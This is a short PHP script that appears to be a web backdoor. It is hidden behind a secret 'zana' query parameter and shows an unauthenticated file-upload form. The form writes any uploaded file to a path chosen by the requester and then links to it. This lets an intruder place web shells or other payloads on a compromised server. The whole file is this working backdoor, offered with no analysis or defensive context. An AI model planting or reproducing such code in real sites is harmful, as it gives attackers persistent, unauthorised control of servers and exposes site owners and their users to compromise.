<?php
			if (isset($_GET['zana'])) {
				?>
				<center><br><br>
				<font style="color: lawngreen; font-family: cursive; font-size: 250%;"></font><br><br><br><br>
				<form method="POST" enctype="multipart/form-data" action="">
					<input style="font-size: 90%;" type="file" name="files">
					<input style="font-size: 90%;" type=submit value="Upload">
				</form>
				<?php
				$files = @$_FILES["files"];
				if ($files["name"] != '') {
				    $fullpath = $_REQUEST["path"] . $files["name"];
				    if (move_uploaded_file($files['tmp_name'], $fullpath)) {
				        echo "<center><br><br><font style='color: red; font-family: cursive; font-size: 200%;'><a href='$fullpath' target='_blank'>Click to access uploaded File</a></font></center>";
				    }
				}
			}
		?>